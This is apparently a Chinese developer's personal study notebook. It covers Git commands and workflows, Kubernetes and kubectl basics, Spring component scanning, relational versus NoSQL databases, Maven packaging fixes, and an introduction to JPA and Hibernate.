1、另一种方式是克隆远程目录，由于是将远程服务器上的仓库完全镜像一份至本地！

```shell
# 克隆一个项目和它的整个代码历史(版本信息)
$ git clone [url]
```



### Git文件操作

#### 文件的四种状态

版本控制就是对文件的版本控制，要对文件进行修改、提交等操作，首先要知道文件当前在什么状态，不然可能会提交了现在还不想提交的文件，或者要提交的文件没提交上。

- Untracked: 未跟踪, 此文件在文件夹中, 但并没有加入到git库, 不参与版本控制. 通过git add 状态变为Staged.
- Unmodify: 文件已经入库, 未修改, 即版本库中的文件快照内容与文件夹中完全一致. 这种类型的文件有两种去处, 如果它被修改, 而变为Modified. 如果使用git rm移出版本库, 则成为Untracked文件
- Modified: 文件已修改, 仅仅是修改, 并没有进行其他的操作. 这个文件也有两个去处, 通过git add可进入暂存staged状态, 使用git checkout 则丢弃修改过, 返回到unmodify状态, 这个git checkout即从库中取出文件, 覆盖当前修改 !
- Staged: 暂存状态. 执行git commit则将修改同步到库中, 这时库中的文件和本地文件又变为一致, 文件为Unmodify状态. 执行git reset HEAD filename取消暂存, 文件状态为Modified



#### 查看文件状态

上面说文件有4种状态，通过如下命令可以查看到文件的状态：

```shell
#查看指定文件状态
git status [filename]
#查看所有文件状态
git status
#添加所有文件到暂存区
git add .
#提交暂存区中的内容到本地仓库 -m 提交信息
git commit -m "消息内容"
```



#### 忽略文件

有些时候我们不想把某些文件纳入版本控制中，比如数据库文件，临时文件，设计文件等

在主目录下建立".gitignore"文件，此文件有如下规则：

1. 忽略文件中的空行或以井号（#）开始的行将会被忽略。
2. 可以使用Linux通配符。例如：星号（*）代表任意多个字符，问号（？）代表一个字符，方括号（[abc]）代表可选字符范围，大括号（{string1,string2,...}）代表可选的字符串等。
3. 如果名称的最前面有一个感叹号（!），表示例外规则，将不被忽略。
4. 如果名称的最前面是一个路径分隔符（/），表示要忽略的文件在此目录下，而子目录中的文件不忽略。
5. 如果名称的最后面是一个路径分隔符（/），表示要忽略的是此目录下该名称的子目录，而非文件（默认文件或目录都忽略）。

```shell
*.txt        #忽略所有 .txt结尾的文件,这样的话上传就不会被选中！
!lib.txt     #但lib.txt除外
/temp        #仅忽略项目根目录下的TODO文件,不包括其它目录temp
build/       #忽略build/目录下的所有文件
doc/*.txt    #会忽略 doc/notes.txt 但不包括 doc/server/arch.txt
```





### Git分支

#### 分支常用命令

```shell
# 列出所有本地分支
git branch

# 列出所有远程分支
git branch -r

# 新建一个分支，但依然停留在当前分支
git branch [branch-name]

# 新建一个分支，并切换到该分支
git checkout -b [branch]

# 合并指定分支到当前分支
$ git merge [branch]

# 删除分支
$ git branch -d [branch-name]

# 删除远程分支
$ git push origin --delete [branch-name]
$ git branch -dr [remote/branch]
```



### Git之Tag

https://www.jianshu.com/p/36202c29e6ae

https://www.jianshu.com/p/cdd80dd15593

https://git-scm.com/book/zh/v2/Git-%E5%9F%BA%E7%A1%80-%E6%89%93%E6%A0%87%E7%AD%BE

https://www.bilibili.com/video/BV1Ee411W79K?from=search&seid=5947882737512645546&spm_id_from=333.337.0.0

> 打标签的作用，就是给项目的开发节点，加上语义化的名字，也即功能版本的别名。 打上标签名的同时，写上附带信息，可以方便项目日后维护过程中的回溯和复查。 另外，也可以通过标签记录，大致了解当前项目的向下兼容性、API的修改和迭代情况。
>
> 不然的话，没有tag，一旦项目出现问题，需要检查某个节点的代码问题，就会有点头疼。 虽然有`commit message`，但还是有存在查找困难和描述不清的问题。

#### 给本地版本打Tag

```shell
比如：我现在给当前代码，提交tag:v1.0.0
 
# 本地修改
git tag -a 1.0.0 -m "1.0.0"
 
# 推送分支
git push origin master
 
# 提交远端
git push origin --tag
```

![img](Akio's Book.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FpblVzZXI=,size_16,color_FFFFFF,t_70.png)

---

> 当然也可以通过idea中的快捷操作来打tag
>
> 首先，找到自己分支的commit记录，复制commit的版本号
>
> ![image-20220109152420879](Akio's Book.assets/image-20220109152420879.png)
>
> VCS->Git->Tag，验证commit版本号
>
> <img src="Akio's Book.assets/image-20220109152642521.png" alt="image-20220109152642521" style="zoom:50%;" />
>
> 最后可以在push的时候，一同把tag推送到远端
>
> <img src="Akio's Book.assets/image-20220109152740979.png" alt="image-20220109152740979" style="zoom:50%;" />



#### github Releases和Tags

https://blog.csdn.net/Eggy2015/article/details/52138751



### 业务场景1：merge rejected

https://blog.csdn.net/aiwaston/article/details/117738262

`git merge ‘你要合入的代码分支’ --allow-unrelated-histories` 然后解决冲突

![image-20211229105417746](Akio's Book.assets/image-20211229105417746.png)

https://developer.aliyun.com/article/614459



### 业务场景2：idea同步两个远程

业务场景：我们开发者提交到公司的github仓库，突然客户需要让我们把我们的代码同步到他们仓库。如我们仓库的sprint分支同步到他们仓库的develop分支。

操作：首先，我们需要在idea中添加客户仓库的remotes。不过首先客户公司要提供一个他们仓库的账号和密码

![image-20211215144122940](Akio's Book.assets/image-20211215144122940.png)

![image-20211215144235491](Akio's Book.assets/image-20211215144235491.png)

然后刷新一下分支，可以发现客户仓库的分支也进来了。所以说我们在我们自己的2021-sprint3分支提交代码后。如果客户那边需要同步。我们就切换到客户的kone/develop分支。然后把我们origin/2021-sprint3的分支合并进来。这样kone/develop分支就是最新的代码。然后在这个分支上去push

![image-20211215144432562](Akio's Book.assets/image-20211215144432562.png)

![image-20211215144756427](Akio's Book.assets/image-20211215144756427.png)

![image-20211215144835622](Akio's Book.assets/image-20211215144835622.png)



### 业务场景3：git如何回滚代码

https://zhuanlan.zhihu.com/p/137856034





## sourceTree

 



## 云原生K8s+Docker+KubeSphere+DevOps

https://www.bilibili.com/video/BV13Q4y1C7hS?from=search&seid=13798867737117338959&spm_id_from=333.337.0.0

https://www.yuque.com/leifengyang/oncloud/ctiwgo



## 阿里云漏洞修复

### Nginx基线检查漏洞

![image-20211215181029648](Akio's Book.assets/image-20211215181029648.png)

https://www.php.cn/linux-458757.html#:~:text=linux%E4%B8%8Bnginx%E9%87%8D%E5%90%AF%E5%91%BD%E4%BB%A4%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%20linux%E4%B8%8Bnginx%E9%87%8D%E5%90%AF%E5%91%BD%E4%BB%A4%E4%B8%BA%EF%BC%9A%E2%80%9Ckill%20-HUP,nginx%E7%9A%84%E8%BF%9B%E7%A8%8B%E5%8F%B7%E2%80%9D%E3%80%82%20%E9%87%8D%E5%90%AF%E6%96%B9%E6%B3%95%EF%BC%9A%E9%A6%96%E5%85%88%E6%9F%A5%E6%89%BE%E5%BD%93%E5%89%8Dnginx%E8%BF%9B%E7%A8%8B%E5%8F%B7%EF%BC%8C%E7%84%B6%E5%90%8E%E8%BE%93%E5%85%A5%E5%91%BD%E4%BB%A4%E2%80%9Ckill%20-HUP%20%E8%BF%9B%E7%A8%8B%E5%8F%B7%E2%80%9D%E5%8D%B3%E5%8F%AF%E5%AE%9E%E7%8E%B0%E9%87%8D%E5%90%AFnginx%E6%9C%8D%E5%8A%A1%E3%80%82



https://www.cnblogs.com/faberbeta/p/13903221.html







## 阿里云日志学习

您好！阿里云最佳实践上新啦！《云速搭部署 SLS 实现日志采集处理分析》最佳实践通过云速搭部署 ECS+SLS，在 ECS 上安装 logtail 收集 nginx 应用日志写入SLS。通过日志生成器模拟 nginx 日志生成，并通过 SLS 进行日志分析。详情查看https://bp.aliyun.com/detail/276





## Spring核心

https://www.bilibili.com/video/BV1K3411C7dn?from=search&seid=17579069777259600741&spm_id_from=333.337.0.0

### @ComponentScan()



### @ComponentScan()扫描索引

> 对于spring来说，他在扫描之前肯定是不知道哪些类上有@Component注解。所以说只要是这个包下的类或者说接口，他都会去扫描，解析，然后判断有没有@Component注解。有的话继续处理，没有就不处理。但总而言之他都会去扫描所有类。
>
> 对此，spring中提供类一种技术，可以用来扫描索引，就可以提高查询的速度。当你明确知道你的哪些类是bean，你就可以把你的bean相关的类写在一个文件中，在其中配置key-value，key对应你的某个类，通常这个类就是你的bean，value就是对应的注解
>
> ![image-20211223174129956](Akio's Book.assets/image-20211223174129956.png)
>
> 如上图，如果要使用扫描索引就需要在META-INF目录下配置spring.components文件，文件中存放的就是上述的键值对
>
> ```properties
> 我要加载的bean							这个bean的注解
> cn.akio.spring.core.service.UserService=org.springframework.stereotype.Component
> ```
>
> spring会根据这个文件来加载bean，举个例子：spring.components文件中我只定义了UserService，没有定义OrderService，
>
> ```java
> UserService.java
> @Component
> public class UserService {
> }
> 
> OrderService.java
> @Component
> public class OrderService {
> }
> 
> Appconfig.java
> @ComponentScan(value = "cn.akio.spring.core")
> public class Appconfig {
> }
> 
> //因为我定义了spring.components文件，所以这个@Component和@ComponentScan注解都没有意义
> 
> test.java
> public class test {
>     public static void main(String[] args) {
>         AnnotationConfigApplicationContext applicationContext = new AnnotationConfigApplicationContext(Appconfig.class);
>         System.out.println(applicationContext.getBean("orderService"));//报错No bean named 'orderService' available
>         System.out.println(applicationContext.getBean("userService"));//成功cn.akio.spring.core.service.UserService@47faa49c
>     }
> }
> ```
>
> 



### @Bean & @Configuration之间的关系





## Spring AOP

https://www.bilibili.com/video/BV1K3411C7dn?from=search&seid=17579069777259600741&spm_id_from=333.337.0.0

https://www.bilibili.com/video/BV1JQ4y1Z79h?from=search&seid=17579069777259600741&spm_id_from=333.337.0.0





## 部署一套完整的企业级K8S集群

https://cloud.tencent.com/developer/article/1821688



## kubectl命令的用法

http://www.codeforest.cn/article/210

https://zhuanlan.zhihu.com/p/364994610

https://blog.csdn.net/qq_29726869/article/details/104363776	在windows电脑上配置kubectl远程操作kubernetes

`kubectl cp uat-wechat-784fb45b98-f2rlt:/springboot/wechat/wechat.log.2021-12-20.0.gz ./wechat.log.2021-12-20.0.gz` 复制容器中的文件出来

`kubectl exec -it uat-wechat-784fb45b98-f2rlt /bin/sh`进入容器



## debug生产环境

https://www.bilibili.com/video/BV1Ef4y137zY

https://arthas.aliyun.com/zh-cn/



## 代码中的if/else优化

https://www.jianshu.com/p/86c86e9557f5



## 如何配置多个开发环境dev/sit/uat/prod

https://blog.csdn.net/it1993/article/details/105207326



## mybatis puls代码生成器

https://www.bilibili.com/video/BV11e411W79W?from=search&seid=10593207625306536939&spm_id_from=333.337.0.0

https://baomidou.com/pages/24112f/#%E7%89%B9%E6%80%A7

https://blog.csdn.net/weixin_44107140/article/details/122301001





## binlog

https://www.cnblogs.com/dadonggg/p/8617826.html





## 简单介绍K8S

https://www.bilibili.com/video/BV1w4411y7Go?from=search&seid=5009315551129224081&spm_id_from=333.337.0.0

> kubernetes的github地址:
> https://github.com/kubernetes/kubernetes
> kubernetes官方站点:
> https://kubernetes.io/
> https://kubernetes.io/zh/
> https://kubernetes.io/docs/
>
> **一、kubernetes基本介绍**
> 1.kubernetes是什么？
> Kubernetes是一个可移植、可扩展的、开源的容器管理平台，简称k8s，可用于管理多个主机上的容器化应用程序。 提供应用程序的快速部署，维护和扩展的基本机制。Kubernetes提供了应用程序的快速部署、扩缩容，升级和回滚的能力，利用service可以实现服务注册、发现和四层负载均衡，通过cordns可实现域名解析，通过ingress可以实现七层负载均衡等功能。Kubernetes这个名字源于希腊语，意思是舵手或飞行员。谷歌在2014年开放了Kubernetes项目，Kubernetes建立在谷歌拥有大量运行生产工作量的十五年经验的基础上，结合了社区中的最佳创意和实践，社区活跃度很高。
> 2.kubernetes容器编排工具具有哪些优势？
> 1）灵活部署
> kubernetes支持在多种平台部署，可在私有云，公有云，混合云，openstack、openshift、VMware vSphere，VMware、Workstation，虚拟机，物理机等环境部署。
> 2）安全高效，拥有完善的认证授权机制，自带审计功能
> 可以对多用户做细化的授权管理（如rbac授权），达到相互之间的操作完全隔离，互不影响，而且自身带有审计功能，可以对操作过程进行实时的日志记录，出现问题可以方便排查。
> 3）负载均衡
> 支持四层、七层负载均衡，可用于多种场景。
> 4）可扩展性强
> 拥有强大的集群扩展能力，可以根据业务规模自动增加和缩减主机节点的数量，确保服务可以承受大量并发带来的压力，保证业务稳定运行。
> 5）根据节点资源的使用情况对pod进行合理的调度
> 可以按照用户需要调度pod，例如保证Pod只在资源足够的节点上运行，会尝试把同一功能的pod分散在不同的节点上，还会尝试平衡不同节点的资源使用率等。
> 6）拥有完善的灾备预警方案
> 拥有多种灾备解决方案，支持备份和容灾，出现故障可以达到秒级切换，保证线上业务不受影响；

> **什么是容器化？**
>
> 虚拟化技术定义：通过虚拟化技术将一台计算机虚拟为多台逻辑计算机，在一台计算机上同时运行多个逻辑计算机，每个逻辑计算机可运行不同的操作系统，并且应用程序都可以在相互独立的空间内运行互不影响，从而显著提高计算机的工作效率
>
> 分类
>
> - 硬件级虚拟化（虚拟机）
>   - 定义：运行在硬件之上的虚拟化技术
>   - 目的：模拟一个完整的操作系统
>   - 常见的管理软件：VMware、virtualbox
> - 操作系统级的虚拟化(容器化)
>   - 定义：运行在操作系统上的虚拟化技术
>   - 目的：模拟运行在操作系统之上的多个不同的进程，并将其封闭在一个密闭的容器中
>   - 常见的管理软件：docker、rktlet、cri-o、cortainerd
>
> **为什么使用容器？**
>
> - 传统的应用部署方式定义：通过插件或者脚本来安装引用，jar
>   - 缺点：不利于应用的升级更新/回滚操作；可以使用虚拟机，但是虚拟机更麻烦，移植性差
> - 容器的优势
>   - 快速创建/部署应用
>   - 持续开发/集成和部署,CI/CD
>   - 开发和运行隔离
>   - 开发/测试/生产 环境的一致性
>   - 跨平台：操作系统的平台无关性
>   - 资源隔离
>   - 资源利用



## 关系型数据库和非关系型数据库

https://zhuanlan.zhihu.com/p/78619241

> 了解关系型数据库之前让我们了解以下什么是二维表结构
>
> 二维表名就是关系名。表中的第一行通常称为属性名，表中的每一个元组和属性都是不可再分的，且元组的次序是无关紧要的。
>
> 常用的关系术语如下：
> 记录 二维表中每一行称为一个记录，或称为一个元组。
> 字段 二维表中每一列称为一个字段，或称为一个属性。
> 域 一组具有相同数据类型的值。例如：自然数就是一个域
>
> <img src="Akio's Book.assets/image-20220109160556300.png" alt="image-20220109160556300" style="zoom:67%;" />
>
> 
>
> **关系型数据库**
>
> 关系型数据库：指采用了关系模型来组织数据的数据库。
> 关系模型指的就是二维表格模型，而一个关系型数据库就是由二维表及其之间的联系所组成的一个数据组织。
>
> ---
>
> 关系模型中常用的概念：
>
> ```json
>  关系：一张二维表，每个关系都具有一个关系名，也就是表名
>  元组：二维表中的一行，在数据库中被称为记录
>  属性：二维表中的一列，在数据库中被称为字段
>  域：属性的取值范围，也就是数据库中某一列的取值限制
>  关键字：一组可以唯一标识元组的属性，数据库中常称为主键，由一个或多个列组成
>  关系模式：指对关系的描述。其格式为：关系名(属性1，属性2， ... ... ，属性N)，在数据库中成为表结构
> ```
>
> ---
>
> 关系型数据库优点：
>
> 1.容易理解：二维表结构是非常贴近逻辑世界的一个概念，关系模型相对网状、层次等其他模型来说更容易理解
> 2.使用方便：通用的SQL语言使得操作关系型数据库非常方便
> 3.易于维护：丰富的完整性(实体完整性、参照完整性和用户定义的完整性)大大减低了数据冗余和数据不一致的概率
>
> ---
>
> 关系型数据库存在的缺点：
>
> 1.网站的用户并发性非常高，往往达到每秒上万次读写请求，对于传统关系型数据库来说，硬盘`I/O`是一个很大的瓶颈
>  2.网站每天产生的数据量是巨大的，对于关系型数据库来说，在一张包含海量数据的表中查询，效率是非常低的
>  3.在基于web的结构当中，数据库是最难进行横向扩展的，当一个应用系统的用户量和访问量与日俱增的时候，数据库却没有办法像`web server`和`app server`那样简单的通过添加更多的硬件和服务节点来扩展性能和负载能力。当需要对数据库系统进行升级和扩展时，往往需要停机维护和数据迁移。
>  4.性能欠佳：在关系型数据库中，导致性能欠佳的最主要原因是多表的关联查询，以及复杂的数据分析类型的复杂SQL报表查询。为了保证数据库的ACID特性，必须尽量按照其要求的范式进行设计，关系型数据库中的表都是存储一个格式化的数据结构。
>
> **数据库事务必须具备`ACID`特性，`ACID`分别是`Atomic`原子性，`Consistency`一致性，
>  `Isolation`隔离性，`Durability`持久性。**

> **非关系型数据库**
>
> 非关系型数据库：指非关系型的，分布式的，且一般不保证遵循`ACID`原则的数据存储系统。
>
> 非关系型数据库结构：非关系型数据库以键值对存储，且结构不固定，每一个元组可以有不一样的字段，每个元组可以根据需要增加一些自己的键值对，不局限于固定的结构，可以减少一些时间和空间的开销。
>
> ##### **优点**
>
> 1.用户可以根据需要去添加自己需要的字段，为了获取用户的不同信息，不像关系型数据库中，要对多表进行关联查询。仅需要根据`id`取出相应的`value`就可以完成查询。
>  2.适用于`SNS(Social Networking Services)`中，例如facebook，微博。系统的升级，功能的增加，往往意味着数据结构巨大变动，这一点关系型数据库难以应付，需要新的结构化数据存储。由于不可能用一种数据结构化存储应付所有的新的需求，因此，非关系型数据库严格上不是一种数据库，应该是一种数据结构化存储方法的集合。
>
> ```json
> 易扩展
> NoSQL数据库种类繁多，但是一个共同的特点都是去掉关系数据库的关系型特性。数据之间无关系，这样就非常容易扩展。无形之间，在架构的层面上带来了可扩展的能力。
> 
> 大数据量，高性能
> NoSQL数据库都具有非常高的读写性能，尤其在大数据量下，同样表现优秀。这得益于它的无关系性，数据库的结构简单。一般MySQL使用Query Cache。NoSQL的Cache是记录级的，是一种细粒度的Cache，所以NoSQL在这个层面上来说性能就要高很多。
> 
> 灵活的数据模型
> NoSQL无须事先为要存储的数据建立字段，随时可以存储自定义的数据格式。而在关系数据库里，增删字段是一件非常麻烦的事情。如果是非常大数据量的表，增加字段简直就是——个噩梦。这点在大数据量的Web 2.0时代尤其明显。
> 
> 高可用
> NoSQL在不太影响性能的情况，就可以方便地实现高可用的架构。比如Cassandra、HBase模型，通过复制模型也能实现高可用。 
> ```
>
> ##### **不足：**
>
> 只适合存储一些较为简单的数据，对于需要进行较复杂查询的数据，关系型数据库显的更为合适。不适合持久存储海量数据
>
> ---
>
> 知名的有redis，mangoDB
>
> ![image-20220109171615066](Akio's Book.assets/image-20220109171615066.png)
>
> 因为数据库系统有更好的规范性和数据完整性，功能更强大，作为持久层更为完善，安全性更高。而 NoSQL 结构松散、不完整，功能有限，目前尚不具备取代数据库的实力，但是作为缓存工具，它的高性能、高响应等功能，使它成为一个很重要的工具。
>
> 当前 Redis 已经成为了主要的 NoSQL 工具，其原因如下。
>
> #### 1）响应快速
>
> Redis 响应非常快，每秒可以执行大约 110 000 个写入操作，或者 81 000 个读操作，其速度远超数据库。如果存入一些常用的数据，就能有效提高系统的性能。
>
> #### 2）支持 6 种数据类型
>
> 它们是字符串、哈希结构、列表、集合、可排序集合和基数。比如对于字符串可以存入一些 [Java](http://c.biancheng.net/java/) 基础数据类型，哈希可以存储对象，列表可以存储 List 对象等。这使得在应用中很容易根据自己的需要选择存储的数据类型，方便开发。
>
> 对于 Redis 而言，虽然只有 6 种数据类型，但是有两大好处：一方面可以满足存储各种[数据结构](http://c.biancheng.net/data_structure/)体的需要；另外一方面数据类型少，使得规则就少，需要的判断和逻辑就少，这样读/写的速度就更快。



## Run&Debug

https://www.cnblogs.com/HelloBigTable/p/10527354.html

> 很多时候，对于maven project中九种生命周期都不是很清楚，今天就来了解下
>
> <img src="Akio's Book.assets/image-20220109173902854.png" alt="image-20220109173902854" style="zoom:50%;" />
>
> ---
>
> idea工具maven projects里面有9种生命周期，生命周期是包含在一个项目构建中的一系列有序的阶段。
>
> 一、最常用的两种打包方法：
> 　　1.clean，package（如果报错，很可能就是jar依赖的问题）
> 　　2.clean，install
>
> 二、9种生命周期：
> 　　1.clean，清理，在进行真正的构建之前进行一些清理工作，移除所有上一次构建生成的文件。执行该命令会删除项目路径下的target文件，但是不会删除本地的maven仓库已经生成的jar文件。
> 　　2.validate，验证，验证工程是否正确，所需的信息是否完整。
> 　　3.compile，编译源码，编译生成class文件,编译命令，只编译选定的目标，不管之前是否已经编译过，会在你的项目路径下生成一个target目录，在该目录中包含一个classes文件夹，里面全是生成的class文件及字节码文件。
> 　　4.test，单元测试，测试。
> 　　5.package，打包，将工程文件打包为指定的格式，例如JAR，WAR等。这个命令会在你的项目路径下一个target目录，并且拥有compile命令的功能进行编译，同时会在target目录下生成项目的jar/war文件。如果a项目依赖于b项目，打包b项目时，只会打包到b项目下target下，编译a项目时就会报错，因为找不到所依赖的b项目，说明a项目在本地仓库是没有找到它所依赖的b项目，这时就用到install命令了
> 　　6.verify，核实，检查package是否有效、符合标准。
> 　　7.install，安装至本地仓库，将包安装至本地仓库，以让其它项目依赖。该命令包含了package命令功能，不但会在项目路径下生成class文件和jar包，同时会在你的本地maven仓库生成jar文件，供其他项目使用（如果没有设置过maven本地仓库，一般在用户/.m2目录下。如果a项目依赖于b项目，那么install b项目时，会在本地仓库同时生成pom文件和jar文件，解决了上面打包package出错的问题）
> 　　8.build：功能类似compile，只是只对整个项目进行编译。
> 　　9.site，站点，生成项目的站点文档
> 　　10.deploy，复制到远程仓库
>
> 三、build和compile的区别
> 　　1.Compile：只编译选定的目标，不管之前是否已经编译过。
> 　　2.Build：是对整个工程进行彻底的重新编译，而不管是否已经编译过。Build过程往往会生成发布包，这个具体要看对IDE的配置了，Build在实际中应用很少，因为开发时候基本上不用，发布生产时候一般都用ANT等工具来发布。Build因为要全部编译，还要执行打包等额外工 作，因此时间较长。

Run指install，package

debug->clean,complie 



## 各种加密方式



## token为啥放redis不放数据库

token是每次请求时要携带的东西，很长时间的不会变，放在redis中更方便

1、token具有时效性，redis处理有优势。
2、在API领域来看，许多受保护的请求都需要token做验证，这样的请求次数一旦比较多，如果token放在数据库，就会增加查询的成本，相较之下redis也有优势，大型map，根据id获取value。
3、登录信息一般不需要长效储存，所以可以减少DB的压力，直接用redis.

https://segmentfault.com/q/1010000010043871	[在退出登录 / 修改密码时怎样实现JWT Token失效？](https://segmentfault.com/q/1010000010043871)



## 聚合打包运行，以及找不到加载主类时候的措施

https://blog.csdn.net/qq_38403590/article/details/106878771

https://www.cnblogs.com/juanxincai/p/13385339.html

https://blog.csdn.net/u011134399/article/details/79103093 maven编译时出现There are test failures

https://blog.csdn.net/u014209205/article/details/79961622 'parent.relativePath' points at no local POM @ line 14, column 13

> 聚合项目打包需要注意，父项目需要install安装到本地仓库，然后在对子项目进行操作

> 当运行jar文件，发现出现如下的报错信息，则是没有找到url信息，实际上是没有找到properties文件
>
> ```sql
> Description:
>  
> Failed to configure a DataSource: 'url' attribute is not specified and no embedded datasource could be configured.
>  
> Reason: Failed to determine a suitable driver class
> ```
>
> 一般使用pom默认打包会打jar包，如果pom中指定使用jar，系统不会自动读取到yml或者properties文件的，需要我们手动配置pom.xml。
>
> ```properties
> <build>
> 		<resources>
>             <resource>
>                 <directory>src/main/resources</directory>
>                 <includes>
>                     <include>**/*.properties</include>
>                 </includes>
>             </resource>
>         </resources>
> </build>
> ```
>
> 配置完成后刷新maven后再打包
>
> https://blog.csdn.net/renkai721/article/details/112257894
>
> 注意，这样操作的话，有可能项目运行起来了但是访问页面的时候发现如下这样的问题，那么十有八九就是你上面这段代码指向的文件位置不对，更有可能是你这个项目下的resources下放着你所有的静态文件static，但是上面代码说的`<includes><include>**/*.properties</include></includes>`则表示仅打包这个类型的文件，所以访问资源的时候就会出现如下图的情况
>
> <img src="Akio's Book.assets/image-20220111215641054.png" alt="image-20220111215641054" style="zoom:50%;" />![image-20220111222728155](Akio's Book.assets/image-20220111222728155.png)
>
> 解决办法
>
> ```sql
> <resource>
>     <directory>src/main/resources</directory>
>       	<includes>
>              <include>static/**</include>
>              <include>**/*.properties</include>
>         </includes>
> </resource>
> 或
> <resource>
>     <directory>src/main/resources</directory>
> </resource>
> ```
>
> 参考文章
>
> https://www.hangge.com/blog/cache/detail_2887.html
>
> https://www.cnblogs.com/wangxuchun/p/7501719.html
>
> https://blog.csdn.net/gaoyipingzgh000/article/details/109600530

> 运行jar文件，发现出现没有加载主类，说明打包的时候没有确定主类，可以添加这个.MF文件标明主类
>
> ![image-20220111141736838](Akio's Book.assets/image-20220111141736838.png)

> [idea springboot项目打jar包部署成功，却无法访问](https://www.cnblogs.com/Marydon20170307/p/13841945.html)



## mvn

### mvn的安装

https://blog.csdn.net/jasnet_u/article/details/81209942

> https://maven.apache.org/download.cgi
>
> ![image-20220111150702029](Akio's Book.assets/image-20220111150702029.png)
>
> 下载加入环境变量中

### mvn的使用





## API接口加密

https://www.bilibili.com/video/BV13f4y117Qh?from=search&seid=17438906131338145761&spm_id_from=333.337.0.0



## POM中的relativePath是啥

https://blog.csdn.net/gzt19881123/article/details/105255138



## Spring-Security加持下的网页如何使用postman进行访问

> 一般请求的时候会发现，没登陆（没获得Spring-security授权）的情况下，请求受保护的接口，就会直接返回登陆页面的代码
>
> <img src="Akio's Book.assets/image-20220112125536811.png" alt="image-20220112125536811" style="zoom:80%;" />
>
> 如何操作呢？我测试的最简单的方法就是，先通过登录接口，带入用户名和密码，成功登录之后在进行其他接口的测试。（注意请求方式）
>
> <img src="Akio's Book.assets/image-20220112125849295.png" alt="image-20220112125849295" style="zoom:80%;" />
>
> 成功登录后，我们再测试其他接口
>
> <img src="Akio's Book.assets/image-20220112125941783.png" alt="image-20220112125941783" style="zoom:67%;" />





## Restful Api

https://restfulapi.cn/

> REST 是 Representational State Transfer的缩写，如果一个架构符合REST原则，就称它为RESTful架构
>
> RESTful 架构可以充分的利用 HTTP 协议的各种功能，是 HTTP 协议的最佳实践
>
> RESTful API 是一种软件架构风格、设计风格，可以让软件更加清晰，更简洁，更有层次，可维护性更好
>
> ![image-20220112160823796](Akio's Book.assets/image-20220112160823796.png)
>
> ![image-20220112160923280](Akio's Book.assets/image-20220112160923280.png)





## Spring Data JPA

https://www.bilibili.com/video/BV1hE411s72B?from=search&seid=15770836875869029654&spm_id_from=333.337.0.0	（main）

https://blog.csdn.net/DDDDeng_/article/details/108197565

https://blog.csdn.net/qq_28289405/article/details/82382441

### 什么是JPA？

> 相同处： 
>
> 1.都跟数据∙库操作有关，JPA 是JDBC 的升华，升级版。 
> 2.JDBC和JPA都是一组规范接口 
> 3.都是由SUN官方推出的 
>
> 不同处： 
>
> 1.JDBC是由各个关系型数据库实现的， JPA 是由**ORM框架**实现 
> 2.JDBC 使用SQL语句和数据库通信。 JPA用面向对象方式， 通过ORM框架来生成SQL，进行操作。 
> 3.JPA在JDBC之上的， JPA也要依赖JDBC才能操作数据库。

> <img src="Akio's Book.assets/image-20220113161246209.png" alt="image-20220113161246209" style="zoom:50%;" />
>
> JDBC是我们最熟悉的用来操作数据库的技术，但是随之而来带来了一些问题： 
>
> 1. 需要面向SQL语句来操作数据库，开发人员学习成本更高.
> 2. 数据库的移至性不高，不同数据库的SQL语句无法通用。 
> 3.  java对象和数据库类型的映射是个麻烦事
>
> 但在Sun在JDK1.5提出了JPA：
>
> JPA全称Java Persistence API（2019年重新命名为 Jakarta Persistence API ），是Sun官方提出的一种**ORM规范**<u>O:Object R: Relational M:mapping</u>。 
>
>  作用 
>
> ```java
> 1.简化持久化操作的开发工作：让开发者从繁琐的 JDBC 和 SQL 代码中解脱出来，直接面向对象持久化操作。
> 2.Sun希望持久化技术能够统一，实现天下归一：如果你是基于JPA进行持久化你可以随意切换数据库。
> ```
>
> 该规范为我们提供了：
>
> ```sql
> 1）ORM映射元数据：JPA支持XML和注解两种元数据的形式，元数据描述对象和表之间的映射关系，框架据此将实体对象持久化到数据库表中；
> 如：@Entity 、 @Table 、@Id 与 @Column等注解。
> 
> 2）JPA的API：用来操作实体对象，执行CRUD操作，框架在后台替我们完成所有的事情，开发者从繁琐的JDBC和 SQL代码中解脱出来。 
> 如：entityManager.merge(T t)； 
> 
> 3）JPQL查询语言：通过面向对象而非面向数据库的查询语言查询数据，避免程序的SQL语句紧密耦合。
>  如：from Student s where s.name = ? 
> ```
>
> So: JPA仅仅是一种规范，也就是说JPA仅仅定义了一些接口，而接口是需要实现才能工作的。



### Hibernate与JPA

所以底层需要某种实现，而Hibernate就是实现了JPA接口的ORM框架。 

也就是说： JPA是一套ORM规范，Hibernate实现了JPA规范！

<img src="Akio's Book.assets/image-20220113162020667.png" alt="image-20220113162020667" style="zoom:80%;" />

> **mybatis**：小巧、方便、高效、简单、直接、半自动 半自动的ORM框架， 
>
> 小巧： mybatis就是jdbc封装 在国内更流行。 
>
> 场景： 在业务比较复杂系统进行使用，
>
> **hibernate**：强大、方便、高效、（简单）复杂、绕弯子、全自动 全自动的ORM框架， 
>
> 强大：根据ORM映射生成不同SQL ,再国外更流行，因为国外的项目大部分没有很多的复杂sql的查询，hibernate就是简单的写都不用写 ，复杂的很难写
>
> 场景： 在业务相对简单的系统进行使用，随着微服务的流行，各个功能模块化，复杂功能被拆分，没有了很多复杂的查询



### 章节预告

> day1:ORM思想和hibernate以及jpa的概述和jpa的基本操作
>
> day2:SpringDataJPA 的运行原理以及基本操作
>
> day3:多表操作，复杂查询



### day01

#### 原始JDBC操作

> ![image-20220114104756160](Akio's Book.assets/image-20220114104756160.png)

#### ORM

```
主要目的：操作实体类就相当于操作数据库表
完成ORM思想需要建立两个映射关系：
		实体类和表的映射关系
		实体类中属性和表中字段的映射关系
不再重点关注：sql语句

实现了ORM思想的框架：mybatis，hibernate
```

#### hibernate框架介绍
	Hibernate是一个开放源代码的对象关系映射框架，
		它对JDBC进行了非常轻量级的对象封装，
		它将POJO与数据库表建立映射关系，是一个全自动的orm框架



#### JPA规范

jpa规范，实现jpa规范，内部是由接口和抽象类组成

> <img src="Akio's Book.assets/image-20220114110022462.png" alt="image-20220114110022462" style="zoom:67%;" />



#### JPA基本操作

> 操作案例：客户的相关操作（增删改查）
>
> ```
> i.搭建环境的过程
> 		1.创建maven工程导入坐标
> 		2.需要配置jpa的核心配置文件
> 			*位置：配置到类路径下的一个叫做 META-INF 的文件夹下
> 			*命名：persistence.xml
> 		3.编写客户的实体类
